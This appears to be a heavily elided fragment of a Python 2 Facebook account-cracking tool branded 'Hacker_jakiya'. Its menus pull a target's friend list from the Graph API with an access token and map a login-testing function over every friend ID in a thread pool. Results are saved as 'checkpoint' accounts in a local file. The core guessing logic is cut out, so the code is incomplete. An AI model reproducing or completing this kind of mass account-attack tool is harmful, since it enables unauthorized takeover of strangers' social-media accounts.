...
def menu2_menu():
    ...
    if m2m == '':
        ...
        os.system('clear')
        jakiya('Please Wait.')
        jakiya('While Is Returning To Main Menu.')
        time.sleep(1)
        os.system('python2 .jakiya.py')
    else:
...
def choice1_menu():
    ...
    if c1m == '':
        ...
        try:
            ...
            jakiya('[\xe2\x9c\x93] \x1b[1;93mAccount  Name: ' + op['name'])
            time.sleep(0.5)
        except KeyError:
        ...
        choice1_menu()
    rana = str(len(id))
    jakiya('[\xe2\x9c\x93] \x1b[1;91mTotal Friends: ' + rana)
    time.sleep(0.5)
    jakiya('[\xe2\x9c\x93]\x1b[1;91m The Process Has Been Started.')
    time.sleep(0.5)
    jakiya('[!] \x1b[1;91mPress CTRL Z To Stop Process')
    time.sleep(0.5)
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                crt = open('Hacker_jakiya/checkpoint.txt', 'a')
    ...
    jakiya('\x1b[1;92m[\xe2\x9c\x93] Checkpoint IDS Has Been Hacker_jakiya.')
    xx = str(len(oks))
...
def choice2_menu():
    ...
    if c2m == '':
        ...
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            jakiya('[\xe2\x9c\x93] \x1b[1;95mAccount  Name: ' + op['name'])
            time.sleep(0.5)
        except KeyError:
            print '[!] ID Not Found!'
            raw_input('\nPress Enter To Back ')
        ...
        choice2_menu()
    rana = str(len(id))
    jakiya('[\xe2\x9c\x93] \x1b[1;95mTotal Friends: ' + rana)
    time.sleep(0.5)
    jakiya('[\xe2\x9c\x93] \x1b[1;95mThe Process Has Been Started.')
    time.sleep(0.5)
    jakiya('[!] \x1b[1;95mPress CTRL Z To Stop Process.')
    time.sleep(0.5)
    print 47 * '-'
    ...
    p.map(main, id)
    print '\x1b[1;93m----------------------------------------------'
    jakiya('[\xe2\x9c\x93] \x1b[1;95mProcess Has Been Completed.')
    jakiya('\x1b[1;97m[\xe2\x9c\x93] \x1b[1;95mCheckpoint IDS Has Been saved.')
    xx = str(len(oks))
    xxx = str(len(checkpoint))
